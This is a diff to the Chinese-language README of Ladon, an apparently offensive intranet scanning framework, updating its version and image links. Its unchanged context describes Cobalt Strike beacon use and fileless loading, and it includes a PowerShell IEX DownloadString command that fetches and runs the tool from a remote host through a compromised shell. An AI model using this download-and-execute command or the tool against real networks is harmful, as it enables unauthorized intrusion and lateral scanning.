@@ -1,4 +1,4 @@
-## Ladon 5.7 20191127
+## Ladon 5.8 20191210
 ![](https://k8gege.github.io/k8img/Ladon/Dragon.jpg)
 
 [![Author](https://img.shields.io/badge/Author-k8gege-blueviolet)](https://github.com/k8gege) 
@@ -11,17 +11,17 @@
 
 
 ### Ladon
-<img src=https://k8gege.github.io/k8img/Ladon/Ladon.gif></img>
+<img src=https://k8gege.org/k8img/Ladon/Ladon.gif></img>
 ### LadonGUI
-<img src=https://k8gege.github.io/k8img/Ladon/LadonGUI.gif></img>
+<img src=https://k8gege.org/k8img/Ladon/LadonGUI.gif></img>
 ### Cobalt Strike
-<img src=https://k8gege.github.io/k8img/Ladon/CS_Ladon.gif></img>
+<img src=https://k8gege.org/k8img/Ladon/CS_Ladon.gif></img>
 ### PowerLadon
-<img src=https://k8gege.github.io/k8img/Ladon/PowerLadon.gif></img>
+<img src=https://k8gege.org/k8img/Ladon/PowerLadon.gif></img>
 ### PythonLadon
-<img src=https://k8gege.github.io/k8img/Ladon//py/PyLadon.PNG></img>
-### LinuxLadon
-<img src=https://k8gege.github.io/k8img/Ladon/lnx/Linux_OnlinePC.PNG></img>
+<img src=https://k8gege.org/k8img/Ladon//py/PyLadon.PNG></img>
+### Kali
+<img src=https://k8gege.org/k8img/Ladon/kaliKali_MS17010.gif></img>
 
 ### 使用说明
 
@@ -112,7 +112,7 @@ Ladon采用C#研发，程序体积很小500K左右，即便马不行也能上传
 20 支持参数加载自定义INI配置文件<br>
 21 支持参数加载自定义PowerShell<br>
 22 支持自定义程序(系统命令或第三方程序即任意语言开发的程序或脚本)<br>
-23 支持自定义模块(支持多种语言编写的DLL/.NET程序集/PowerShell脚本)<br>
+23 插件(支持多种语言C#/Delphi/Golang/Python/VC/PowerShell)<br>
 24 支持Cobalt Strike(beacon命令行下扫描目标内网或跳板扫描外网目标)<br>
 
 ### 内置功能模块(40)
@@ -336,21 +336,21 @@ PowerShell版,也可CMD命令行下远程加载内存实现无文件扫描，模
 > Import-Module .\Ladon.ps1
 > Ladon OnlinePC
 ```
-<img src=https://k8gege.github.io/k8img/Ladon/PowerLadon.gif></img>
+<img src=https://k8gege.org/k8img/Ladon/PowerLadon.gif></img>
 
 #### 0x002 Cmd本地加载
 适用于还没跟上时代的远控或Shell只支持CMD交互
 ```bash
 > powershell Import-Module .\Ladon.ps1;Ladon OnlinePC
 ```
-<img src=https://k8gege.github.io/k8img/Ladon/ps/CmdPSLadon.gif></img>
+<img src=https://k8gege.org/k8img/Ladon/ps/CmdPSLadon.gif></img>
 
 #### 0x003 Cmd远程加载
 适用于还没跟上时代的远控或Shell只支持CMD交互
 ```bash
 > powershell "IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.5:800/Ladon.ps1'); Ladon OnlinePC"
 ```
-<img src=https://k8gege.github.io/k8img/Ladon/ps/CmdPSRemoteLadon.gif></img>
+<img src=https://k8gege.org/k8img/Ladon/ps/CmdPSRemoteLadon.gif></img>
 
 ### 高级用法
 Ladon最初的设计就是一款扫描框架，为了方便才内置功能<br>
